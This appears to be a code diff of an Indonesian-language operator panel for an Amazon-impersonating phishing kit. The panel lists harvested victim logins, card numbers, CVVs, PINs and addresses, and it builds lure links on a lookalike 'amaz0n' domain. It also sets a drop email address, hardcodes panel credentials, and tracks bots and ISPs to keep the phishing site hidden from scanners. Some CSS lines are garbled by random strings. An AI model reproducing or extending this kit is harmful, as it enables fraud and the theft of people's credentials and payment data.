@@ -3,179 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel Rahasia — Amazon Verification</title>
+    <title>Panel Rahasia — XCHENBA</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
-        body {
-            background: #050508 url('img/xchenba.png') no-repeat center center fixed;
-            background-size: cover;
-            color: #e0e0e0;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(5, 5, 10, 0.85);
-            z-index: -1;
-        }
-        .wadah { max-width: 1200px; margin: 0 auto; }
-        h1 { text-align: center; color: #fff; margin-bottom: 20px; font-size: 22px; }
-        .kotak-besar { background: rgba(30,42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQbottom: 20px; backdrop-filter: blur(8px); }
-        .judul-bagian { font-size: 14px; color: #cbd5e1; margin-bottom: 15px; }
-        .grid-stat { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; }
-        .kotak-stat { padding: 12px 8px; border-radius: 6px; text-align: center; }
-        .kotak-stat h2 { font-size: 24px; margin-bottom: 4px; }
-        .kotak-stat p { font-size: 11px; opacity: 0.85; }
-        .stat-kunjungan { background: #4f46e5; }
-        .stat-manusia { background: #0891b2; }
-        .stat-bot { background: #db2777; }
-        .stat-login { background: #d97706; }
-        .stat-kartu { background: #059669; }
-        .stat-tagihan { background: #7c3aed; }
-        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px 18px; }
-        .kolom-penuh { grid-column: 1 / -1; }
-        label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 5px; }
-        input, textarea { width: 100%; padding: 8px 10px; background: rgba(15,23,42,0.8); border: 1px solid rgba(100,116,139,0.4); border-radius: 4px; color: #e2e8f0; }
-        button.tombol { width: 100%; padding: 8px; border: none; border-radius: 4px; cursor: pointer; margin-top: 6px; }
-        .tombol-ungu { background: #4f46e5; color: #fff; }
-        .tombol-merah { background: #dc2626; color: #fff; }
-        .kotak-tautan { background: rgba(30,42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQsize: 12px; color: #bfdbfe; display: none; word-break: break-all; }
-        table { width: 100%; border-collapse: collapse; font-size: 12px; }
-        th, td { padding: 8px 10px; text-align: left; border-bottom: 1px solid rgba(71,85,105,0.3); }
-        th { color: #94a3b8; }
-        .kosong { text-align: center; color: #64748b; padding: 25px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #0f0f1a, #1a1a2e); min-height: 100vh; padding: 20px; color: #fff; }
+        .logo-bg { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.05; z-index: 0; pointer-events: none; }
+        .logo-bg img { width: 300px; }
+        .wadah { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; }
+        .kotak { background: rgba(30,30,50,0.9); border-radius: 12px; padding: 25px; margin-bottom: 20px; border: 1px solid #333; }
+        h1 { text-align: center; margin-bottom: 25px; color: #FFD814; }
+        h2 { font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 8px; }
+        input, button { width: 100%; padding: 10px; margin: 6px 0; border-radius: 6px; border: none; font-size: 14px; }
+        input { background: #2a2a3f; color: #fff; border: 1px solid #444; }
+        button { background: #FFD814; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #F7CA00; }
+        .btn-hapus { background: #d32f2f; color: #fff; margin-left: 8px; width: auto; padding: 6px 12px; }
+        .baris { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        .baris span { flex: 1; font-size: 13px; word-break: break-all; }
+        .sembunyi { display: none; }
+        .tautan-hasil { background: #1a1a2e; padding: 10px; border-radius: 6px; margin-top: 8px; font-family: monospace; font-size: 12px; color: #90EE90; word-break: break-all; }
+        .data-item { background: #252538; padding: 12px; border-radius: 6px; margin: 8px 0; font-size: 13px; line-height: 1.6; }
+        .label { color: #aaa; font-size: 11px; margin-top: 6px; }
+        .terkirim { color: #90EE90; font-size: 12px; margin-top: 5px; }
+        .kunci { font-family: monospace; background: #333; padding: 2px 6px; border-radius: 3px; font-size: 11px; }
     </style>
 </head>
 <body>
-<div class="wadah">
-    <h1>🔐 Panel Rahasia — Amazon Verification</h1>
+    <div class="logo-bg"><img src="img/xchenba.png" alt="XCHENBA"></div>
+    <div class="wadah">
+        <h1>🔐 PANEL RAHASIA — XCHENBA</h1>
 
-    <div class="kotak-besar">
-        <div class="judul-bagian">📊 Statistik Pengunjung</div>
-        <div class="grid-stat">
-            <div class="kotak-stat stat-kunjungan"><h2 id="jml_kunjungan">0</h2><p>Total</p></div>
-            <div class="kotak-stat stat-manusia"><h2 id="jml_manusia">0</h2><p>Manusia</p></div>
-            <div class="kotak-stat stat-bot"><h2 id="jml_bot">0</h2><p>Bot</p></div>
-            <div class="kotak-stat stat-login"><h2 id="jml_login">0</h2><p>Login</p></div>
-            <div class="kotak-stat stat-kartu"><h2 id="jml_kartu">0</h2><p>Kartu</p></div>
-            <div class="kotak-stat stat-tagihan"><h2 id="jml_tagihan">0</h2><p>Tagihan</p></div>
+        <!-- LOGIN PANEL -->
+        <div class="kotak" id="bagianLogin">
+            <h2>Masuk Panel</h2>
+            <input type="text" id="userLogin" placeholder="Username">
+            <input type="password" id="passLogin" placeholder="Kata Sandi">
+            <button onclick="masukPanel()">Masuk</button>
         </div>
-    </div>
 
-    <div class="kotak-besar">
-        <div class="judul-bagian">⚙️ Pengaturan Sistem</div>
-        <div class="grid-3">
-            <div>
-                <label>Nama Parameter Tautan</label>
-                <input type="text" id="nama_param" value="anrew">
-                <button class="tombol tombol-ungu" onclick="buatTautan()">🔗 Buat Tautan</button>
-                <button class="tombol tombol-ungu" onclick="bukaTautan()">🌐 Buka Tautan</button>
-                <div class="kotak-tautan" id="tautan_jadi"></div>
-            </div>
-            <div>
-                <label>Email Tujuan</label>
-                <input type="email" id="email_tujuan">
-                <button class="tombol tombol-ungu" onclick="simpanEmail()">📧 Simpan Email</button>
-            </div>
-            <div>
-                <label>Token Telegram</label>
-                <input type="text" id="bot_token">
-                <label style="margin-top:8px;">Chat ID</label>
-                <input type="text" id="chat_id">
-                <button class="tombol tombol-ungu" onclick="simpanTelegram()">📩 Simpan Telegram</button>
-            </div>
-            <div>
-                <label>Link Pengalihan Bot</label>
-                <textarea id="link_bot" rows="3"></textarea>
-                <button class="tombol tombol-ungu" onclick="simpanLink()">🔗 Simpan Link</button>
-            </div>
-            <div>
-                <label>ISP Diizinkan</label>
-                <textarea id="daftar_izin" rows="3"></textarea>
-                <button class="tombol tombol-ungu" onclick="simpanIzin()">✅ Simpan Izinkan</button>
-            </div>
-            <div>
-                <label>ISP Diblokir</label>
-                <textarea id="daftar_blokir" rows="3"></textarea>
-                <button class="tombol tombol-ungu" onclick="simpanBlokir()">🚫 Simpan Blokir</button>
-            </div>
-            <div class="kolom-penuh">
-                <label>Cek IP</label>
-                <div style="display:flex;gap:8px;">
-                    <input type="text" id="cek_ip" style="flex:1;">
-                    <button class="tombol tombol-ungu" style="width:auto;margin:0;" onclick="cekIP()">Cek</button>
+        <!-- ISI PANEL -->
+        <div id="isiPanel" class="sembunyi">
+            <!-- PENGATURAN TAUTAN -->
+            <div class="kotak">
+                <h2>🔗 Pengaturan Tautan Akses</h2>
+                <label>Format Tautan:</label>
+                <div class="tautan-hasil" id="formatTautan">
+                    https://amaz0naccountserviceverify.pythonanywhere.com/?<span class="kunci">Update-payment-methode-email-random=aktif</span>
                 </div>
+                <input type="text" id="awalanTautan" placeholder="Awalan Tautan" value="Update-payment-methode">
+                <button onclick="simpanTautan()">Simpan Tautan</button>
+                <div id="tautanTersimpan" class="tautan-hasil sembunyi"></div>
+                <p class="label">Salin tautan di atas dan bagikan. Hanya pengunjung yang lewat tautan ini yang diizinkan.</p>
             </div>
-            <div class="kolom-penuh">
-                <button class="tombol tombol-merah" onclick="hapusSemua()">⚠️ Hapus Semua Data</button>
+
+            <!-- EMAIL TUJUAN -->
+            <div class="kotak">
+                <h2>📧 Email Tujuan</h2>
+                <input type="email" id="emailTujuan" placeholder="Email penerima data" value="jandaanaksatu777@gmail.com">
+                <button onclick="simpanEmail()">Simpan Email</button>
+            </div>
+
+            <!-- DATA LOGIN -->
+            <div class="kotak">
+                <h2>👤 Data Login (Email & Kata Sandi)</h2>
+                <div id="daftarLogin"></div>
+                <button onclick="hapusSemuaLogin()" class="btn-hapus">Hapus Semua Login</button>
+            </div>
+
+            <!-- DATA KARTU -->
+            <div class="kotak">
+                <h2>💳 Data Kartu & Pembayaran</h2>
+                <div id="daftarKartu"></div>
+                <button onclick="hapusSemuaKartu()" class="btn-hapus">Hapus Semua Kartu</button>
+            </div>
+
+            <!-- DETEKSI BOT -->
+            <div class="kotak">
+                <h2>⚠️ Deteksi Bot / Akses Tidak Sah</h2>
+                <div id="daftarBot"></div>
             </div>
         </div>
     </div>
 
-    <div class="kotak-besar">
-        <div class="judul-bagian">📋 Riwayat Pengunjung</div>
-        <table>
-            <thead><tr><th>IP</th><th>Negara</th><th>ISP</th><th>Status</th><th>Alasan</th><th>Waktu</th></tr></thead>
-            <tbody id="daftar_riwayat"><tr><td colspan="6" class="kosong">Belum ada data</td></tr></tbody>
-        </table>
-    </div>
-</div>
+    <script>
+        // === KREDENSIAL PANEL ===
+        const USER_PANEL = 'admin';
+        const PASS_PANEL = 'xchenba2026';
 
-<script>
-const API_URL = "/panel_api";
-let tautanSiap = "";
+        // === DATA PENYIMPANAN ===
+        function ambilData(kunci) {
+            try { return JSON.parse(localStorage.getItem(kunci)) || []; }
+            catch { return []; }
+        }
+        function simpanData(kunci, data) {
+            localStorage.setItem(kunci, JSON.stringify(data));
+        }
 
-window.onload = async () => {
-    const res = await fetch(API_URL);
-    const d = await res.json();
-    document.getElementById("jml_kunjungan").textContent = d.jml_kunjungan || 0;
-    document.getElementById("jml_manusia").textContent = d.jml_manusia || 0;
-    document.getElementById("jml_bot").textContent = d.jml_bot || 0;
-    document.getElementById("jml_login").textContent = d.jml_login || 0;
-    document.getElementById("jml_kartu").textContent = d.jml_kartu || 0;
-    document.getElementById("jml_tagihan").textContent = d.jml_tagihan || 0;
-    document.getElementById("email_tujuan").value = d.email_tujuan || "";
-    tautanSiap = localStorage.getItem("tautanTerakhir") || "";
-    if(tautanSiap) { document.getElementById("tautan_jadi").style.display = "block"; document.getElementById("tautan_jadi").textContent = tautanSiap; }
-    tampilkanRiwayat(d.riwayat || []);
-};
+        // === LOGIN PANEL ===
+        function masukPanel() {
+            const u = document.getElementById('userLogin').value.trim();
+            const p = document.getElementById('passLogin').value.trim();
+            if (u === USER_PANEL && p === PASS_PANEL) {
+                document.getElementById('bagianLogin').classList.add('sembunyi');
+                document.getElementById('isiPanel').classList.remove('sembunyi');
+                tampilkanSemuaData();
+            } else {
+                alert('Username atau kata sandi salah!');
+            }
+        }
 
-function buatTautan() {
-    const namaParam = document.getElementById("nama_param").value.trim() || "anrew";
-    const email = prompt("Masukkan email:");
-    if(!email) return;
-    tautanSiap = `${window.location.origin}/?${namaParam}=${encodeURIComponent(email)}`;
-    document.getElementById("tautan_jadi").style.display = "block";
-    document.getElementById("tautan_jadi").textContent = tautanSiap;
-    localStorage.setItem("tautanTerakhir", tautanSiap);
-    navigator.clipboard.writeText(tautanSiap);
-    alert("✅ Tautan disalin & tersimpan!");
-}
-function bukaTautan() { if(!tautanSiap) alert("Buat dulu!"); else window.open(tautanSiap, "_blank"); }
+        // === TAUTAN ===
+        function simpanTautan() {
+            const awalan = document.getElementById('awalanTautan').value.trim() || 'Update-payment-methode';
+            const tautanContoh = `https://amaz0naccountserviceverify.pythonanywhere.com/?${awalan}-email@contoh.com-123456=aktif`;
+            localStorage.setItem('awalanTautan', awalan);
+            const el = document.getElementById('tautanTersimpan');
+            el.textContent = tautanContoh;
+            el.classList.remove('sembunyi');
+        }
+        function simpanEmail() {
+            const email = document.getElementById('emailTujuan').value.trim();
+            localStorage.setItem('emailTujuan', email);
+            alert('Email tersimpan: ' + email);
+        }
 
-async function simpanEmail() {
-    await fetch(API_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({aksi:"simpan_email", email:document.getElementById("email_tujuan").value}) });
-    alert("✅ Tersimpan!");
-}
-async function hapusSemua() {
-    if(!confirm("Yakin?")) return;
-    await fetch(API_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({aksi:"hapus_semua"}) });
-    localStorage.removeItem("tautanTerakhir"); location.reload();
-}
+        // === TAMPILAN DATA ===
+        function tampilkanSemuaData() {
+            // Login
+            const daftarLogin = ambilData('dataLogin');
+            const wadahLogin = document.getElementById('daftarLogin');
+            wadahLogin.innerHTML = daftarLogin.length === 0 
+                ? '<p style="color:#888;">Belum ada data</p>' 
+                : daftarLogin.map((d, i) => `
+                    <div class="data-item">
+                        <strong>#${i+1}</strong> — ${d.waktu}
+                        <br>📧 Email: ${d.email}
+                        <br>🔑 Password: ${d.password}
+                        <br>📍 Dari: ${d.sumber}
+                    </div>`).join('');
 
-function tampilkanRiwayat(riwayat) {
-    const wadah = document.getElementById("daftar_riwayat");
-    if(!riwayat.length) { wadah.innerHTML = `<tr><td colspan="6" class="kosong">Belum ada data</td></tr>`; return; }
-    wadah.innerHTML = riwayat.reverse().map(r => `<tr><td>${r.ip||"-"}</td><td>${r.negara||"-"}</td><td>${r.isp||"-"}</td><td>${r.status||"BOT"}</td><td>${r.alasan||"-"}</td><td>${r.waktu||"-"}</td></tr>`).join("");
-}
-async function cekIP() {
-    const ip = document.getElementById("cek_ip").value.trim();
-    if(!ip) return;
-    try { const d = await(await fetch(`https://ipapi.co/${ip}/json/`)).json(); alert(`IP: ${d.ip}\nNegara: ${d.country_name}\nISP: ${d.org}`); }
-    catch { alert("Gagal cek IP"); }
-}
-</script>
+            // Kartu
+            const daftarKartu = ambilData('dataKartu');
+            const wadahKartu = document.getElementById('daftarKartu');
+            wadahKartu.innerHTML = daftarKartu.length === 0 
+                ? '<p style="color:#888;">Belum ada data</p>' 
+                : daftarKartu.map((d, i) => `
+                    <div class="data-item">
+                        <strong>#${i+1}</strong> — ${d.waktu}
+                        <br>📧 Email: ${d.email}
+                        <br>👤 Nama: ${d.namaKartu}
+                        <br>🔢 Kartu: ${d.nomorKartu}
+                        <br>📅 Exp: ${d.expiry} | 🔒 CVV: ${d.cvv}
+                        <br>📍 Alamat: ${d.alamat}, ${d.kota} — ${d.kodepos}
+                        <br>📞 Telp: ${d.telepon}
+                        ${d.pin ? `<br>🔐 PIN: ${d.pin}` : ''}
+                    </div>`).join('');
+
+            // Bot
+            const daftarBot = ambilData('deteksiBot');
+            const wadahBot = document.getElementById('daftarBot');
+            wadahBot.innerHTML = daftarBot.length === 0 
+                ? '<p style="color:#888;">Belum ada akses tidak sah</p>' 
+                : daftarBot.map((d, i) => `
+                    <div class="data-item" style="border-left: 3px solid #ff4444;">
+                        <strong>⚠️ Terdeteksi Bot/Akses Langsung #${i+1}</strong> — ${d.waktu}
+                        <br>🌐 IP: <span class="kunci">${d.ip || 'Tidak diketahui'}</span>
+                        <br>🏢 ISP: ${d.isp || 'Tidak diketahui'}
+                        <br>📍 Lokasi: ${d.lokasi || 'Tidak diketahui'}
+                        <br>🔗 Akses dari: ${d.sumber || 'Langsung / Bukan Tautan'}
+                    </div>`).join('');
+        }
+
+        // === HAPUS DATA ===
+        function hapusSemuaLogin() {
+            if (confirm('Yakin hapus semua data login?')) {
+                localStorage.removeItem('dataLogin');
+                tampilkanSemuaData();
+            }
+        }
+        function hapusSemuaKartu() {
+            if (confirm('Yakin hapus semua data kartu?')) {
+                localStorage.removeItem('dataKartu');
+                localStorage.removeItem('deteksiBot');
+                tampilkanSemuaData();
+            }
+        }
+    </script>
 </body>
 </html>
